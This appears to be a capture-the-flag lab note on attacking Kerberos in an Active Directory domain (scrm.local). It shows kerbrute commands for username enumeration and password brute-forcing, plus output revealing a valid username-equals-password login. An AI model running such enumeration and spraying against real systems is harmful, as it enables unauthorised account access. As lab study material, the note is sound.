
When Plaintext or NTLM Authentication isn't working we need to utilize Kerberos Auth to spray users. We can utilize an tool called "kerbrute" for this.

```
kerbrute userenum --dc 10.129.207.49 -d scrm.local /usr/share/wordlists/kerberos_enum_userlists/A-ZSurnames.txt 
```

Testing Login

```
kerbrute bruteuser --dc 10.129.44.233 -d scrm.local users.txt ksimpson

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 08/04/26 - Ronnie Flathers @ropnop

2026/08/04 17:25:41 >  Using KDC(s):
2026/08/04 17:25:41 >   10.129.44.233:88

2026/08/04 17:25:41 >  [+] VALID LOGIN:  ksimpson@scrm.local:ksimpson
2026/08/04 17:25:41 >  Done! Tested 1 logins (1 successes) in 0.074 seconds
```